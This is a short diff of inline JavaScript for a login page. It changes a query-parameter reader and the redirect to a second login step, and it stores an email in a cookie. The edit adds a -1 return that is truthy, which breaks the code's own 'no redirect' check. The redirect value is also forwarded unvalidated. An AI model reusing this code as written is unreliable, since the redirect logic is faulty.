@@ -150,22 +150,23 @@
 		}
 	}
 	function urldata(key) {
-		var u = location.href;
-		var n = key.length;
-		var i = u.search(key)+n+1;
-		var a = "";
-		while(u.charAt(i)!=""&&u.charAt(i)!="&") {
-			a += u.charAt(i);
-			++i;
-		}
-		return a;
-	}
+        var u = location.href;
+        var n = key.length;
+        var i = u.search(key)+n+1;
+        var a = "";
+        while(u.charAt(i)!=""&&u.charAt(i)!="&") {
+            a += u.charAt(i);
+            ++i;
+        }
+        if(u.search(key)==-1) {return -1;}
+        return a;
+    }
 	function cango() {
 		Cookies.set('email', ddddd);
 		if(!urldata("redirect")) {
-			window.location.href="./GLogin2.html";
+			window.location.href="./GLogin2";
 		} else {
-			window.location.href="./GLogin2.html?redirect="+urldata("redirect");
+			window.location.href="./GLogin2?redirect="+urldata("redirect");
 		}
 	}
 </script>
